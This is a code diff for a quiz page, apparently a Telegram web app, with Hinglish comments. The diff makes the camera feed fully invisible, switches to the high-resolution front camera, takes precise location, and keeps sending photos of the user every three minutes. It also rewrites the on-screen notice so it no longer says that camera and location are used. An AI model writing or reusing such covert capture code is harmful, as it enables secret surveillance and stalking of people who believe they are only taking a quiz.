@@ -15,14 +15,13 @@
         button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
         .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
         
-        /* Video ko hidden but active rakhne ke liye */
+        /* Video ko background mein active rakhein */
         #proctorVideo {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 160px; /* Chota size rakha taaki render ho sake */
-            height: 90px;
-            opacity: 0.01; /* Halqa sa dikhega par transparent hoga */
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            opacity: 0; /* User ko nahi dikhega par camera chalta rahega */
             z-index: -1;
             pointer-events: none;
         }
@@ -36,7 +35,7 @@
     <div class="instruction-box">
         • सिस्टम सेटअप किया जा रहा है।<br>
         • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
-        • <b>नोट:</b> Perfect HD कैमरा और लोकेशन वेरिफिकेशन अनिवार्य है।
+        • <b>नोट:</b> Perfect Verification अनिवार्य है।
     </div>
     <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
 </div>
@@ -66,21 +65,26 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Connecting... ⏳";
+        btn.innerText = "Processing... ⏳";
 
         try {
-            // Camera setup with high priority
+            // Camera setup: Ideal settings for Mobile Front Camera
             globalStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 1280, height: 720 } 
+                video: { 
+                    facingMode: "user",
+                    width: { ideal: 1080 },
+                    height: { ideal: 1920 } 
+                } 
             });
+            
             const video = document.getElementById('proctorVideo');
             video.srcObject = globalStream;
             
-            // Wait for video to actually start playing
             video.onloadedmetadata = () => {
                 video.play();
             };
 
+            // Location check
             const pos = await new Promise((res, rej) => {
                 navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
             });
@@ -90,12 +94,12 @@
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // Pahli photo ke liye 4 second wait karein taaki camera feed aa jaye
-            setTimeout(() => captureAndSend("Test_Started"), 4000);
-            setInterval(() => captureAndSend("Monitoring"), 180000);
+            // Photo capture logic
+            setTimeout(() => captureAndSend("Entry_Photo"), 3000);
+            setInterval(() => captureAndSend("Live_Monitoring"), 180000);
 
         } catch (err) {
-            alert("Error: Camera ya Location allow karein.");
+            alert("Please allow Camera & Location!");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
@@ -103,18 +107,23 @@
 
     function captureAndSend(statusType) {
         const video = document.getElementById('proctorVideo');
-        if (!video.srcObject) return;
+        if (video.readyState !== 4) return;
 
         const canvas = document.createElement('canvas');
-        // Perfect 16:9 HD ratio
-        canvas.width = 1280;
-        canvas.height = 720;
+        
+        // Naya: Camera ke asli size ke hisaab se canvas set karna
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         
         const ctx = canvas.getContext('2d');
         
-        // Ensure image is drawn fully
-        ctx.drawImage(video, 0, 0, 1280, 720);
+        // Mirror effect hatane ke liye (optional):
+        // ctx.translate(canvas.width, 0);
+        // ctx.scale(-1, 1);
         
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Quality 0.8 tak rakhi hai taaki clear dikhe
         const photoData = canvas.toDataURL('image/jpeg', 0.8);
 
         const payload = {
@@ -131,7 +140,7 @@
     }
 
     function loadQuestion() {
-        if (currentIdx >= questions.length) { alert("Test Complete!"); tg.close(); return; }
+        if (currentIdx >= questions.length) { alert("Test Completed!"); tg.close(); return; }
         const qData = questions[currentIdx];
         document.getElementById("question").innerText = qData.q;
         const optionsDiv = document.getElementById("options");
